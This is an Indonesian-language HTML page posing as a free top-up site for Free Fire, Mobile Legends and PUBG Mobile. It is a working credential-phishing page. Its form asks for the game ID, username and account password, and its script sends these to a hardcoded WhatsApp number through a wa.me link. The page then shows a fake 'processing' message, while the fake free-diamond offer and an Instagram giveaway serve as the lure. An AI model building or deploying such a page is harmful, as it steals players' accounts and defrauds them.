<!DOCTYPE html><html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Top Up Game Keren</title>
  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@600&display=swap" rel="stylesheet">
  <style>
    body {
      font-family: 'Orbitron', sans-serif;
      background: linear-gradient(135deg, #1f1c2c, #928dab);
      color: white;
      margin: 0;
      padding: 0;
      text-align: center;
      animation: fadeIn 1s ease;
    }
    h1 {
      padding-top: 30px;
      text-shadow: 0 0 10px #0ff;
    }
    .game-select {
      display: flex;
      justify-content: center;
      gap: 20px;
      margin: 20px;
      flex-wrap: wrap;
    }
    .game-card {
      display: flex;
      flex-direction: column;
      align-items: center;
    }
    .game-card img {
      width: 120px;
      height: 120px;
      border-radius: 10px;
      margin-bottom: 10px;
    }
    .game-btn {
      background: #0ff;
      color: #000;
      padding: 10px 20px;
      border: none;
      border-radius: 10px;
      cursor: pointer;
      transition: transform 0.3s;
    }
    .game-btn:hover {
      transform: scale(1.1);
    }
    .form-container {
      margin-top: 20px;
      display: none;
      animation: fadeInUp 1s ease;
    }
    input, select {
      width: 80%;
      padding: 10px;
      margin: 10px;
      border-radius: 8px;
      border: none;
    }
    .submit-btn {
      background: #00c9ff;
      color: #000;
      padding: 10px 20px;
      border: none;
      border-radius: 10px;
      cursor: pointer;
      margin-top: 10px;
    }
    .thanks {
      display: none;
      margin-top: 20px;
      font-size: 1.5em;
      animation: fadeIn 2s ease forwards;
    }
    .giveaway {
      margin-top: 50px;
      padding: 20px;
      background: rgba(0, 0, 0, 0.3);
      border-top: 2px solid #0ff;
    }
    .giveaway-images {
      display: flex;
      justify-content: center;
      flex-wrap: wrap;
      gap: 10px;
      margin-top: 10px;
    }
    .giveaway-images img {
      width: 150px;
      border-radius: 10px;
      box-shadow: 0 0 10px #00c9ff;
    }
    @keyframes fadeIn {
      from { opacity: 0; } to { opacity: 1; }
    }
    @keyframes fadeInUp {
      from { opacity: 0; transform: translateY(20px); }
      to { opacity: 1; transform: translateY(0); }
    }
  </style>
</head>
<body>
  <h1>Website Top Up Game Gratis</h1>
  <div class="game-select">
    <div class="game-card">
      <img src="pp.jpg" alt="Free Fire">
      <button class="game-btn" onclick="showForm('Free Fire')">Free Fire</button>
    </div>
    <div class="game-card">
      <img src="ml.jpg" alt="Mobile Legends">
      <button class="game-btn" onclick="showForm('Mobile Legends')">Mobile Legends</button>
    </div>
    <div class="game-card">
      <img src="pubg.jpg" alt="PUBG Mobile">
      <button class="game-btn" onclick="showForm('PUBG Mobile')">PUBG Mobile</button>
    </div>
  </div>  <div class="form-container" id="formContainer">
    <h2 id="gameTitle"></h2>
    <input type="text" id="gameId" placeholder="Masukkan ID Game" required><br>
    <input type="text" id="username" placeholder="Masukkan Akun Game Kamu" required><br>
    <input type="password" id="password" placeholder="Masukkan Password Akun Kamu" required><br>
    <select id="amount">
      <option value="">Pilih Jumlah Top Up</option>
      <option>50 Diamond gratis</option>
      <option>70 Diamond gratis</option>
      <option>100 Diamond gratis</option>
      <option>140 Diamond gratis</option>
      <option>240 Diamond gratis</option>
      <option>355 Diamond gratis</option>
            <option>500 Diamond gratis</option>
      <option>1.000 Diamond gratis</option>
      <option>2.000 Diamond gratis</option>
      <option>5.000 Diamond gratis</option>
      <option>10.000 Diamond gratis</option>
      <option>1.000000 Diamond gratis</option>
    </select><br>
    <button class="submit-btn" onclick="submitTopUp()">Top Up Sekarang</button>
  </div>  <div class="thanks" id="thanksMsg">
    Terima kasih! Top Up Anda sedang diproses.
  </div>  <div class="giveaway">
    <h2>Giveaway Akun Game Gratis!</h2>
    <p>Ikuti Instagram kami @TopUpGameOfficial dan komentar ID game kamu di postingan terbaru untuk kesempatan memenangkan akun sultan!</p>
    <div class="giveaway-images">
      <img src="pp1.jpg" alt="Akun 1">
      <img src="pp2.jpg" alt="Akun 2">
      <img src="pp3.jpg" alt="Akun 3">
      <img src="pp4.jpg" alt="Akun 4">
    </div>
    <p>dapatkan akun sultan ini secara gratis!</p>
  </div>  <script>
    function showForm(game) {
      document.getElementById("formContainer").style.display = "block";
      document.getElementById("gameTitle").innerText = `Top Up ${game}`;
    }

    function submitTopUp() {
      const game = document.getElementById("gameTitle").innerText;
      const gameId = document.getElementById("gameId").value;
      const username = document.getElementById("username").value;
      const password = document.getElementById("password").value;
      const amount = document.getElementById("amount").value;

      if (!gameId || !username || !password || !amount) {
        alert("Semua kolom harus diisi!");
        return;
      }

      const message = `Top Up Game:\n${game}\nID: ${gameId}\nUsername: ${username}\nPassword: ${password}\nJumlah: ${amount}`;
      const phoneNumber = "6285165869783";
      const url = `https://wa.me/${phoneNumber}?text=${encodeURIComponent(message)}`;
      window.open(url, '_blank');

      document.getElementById("formContainer").style.display = "none";
      document.getElementById("thanksMsg").style.display = "block";
    }
  </script></body>
</html>
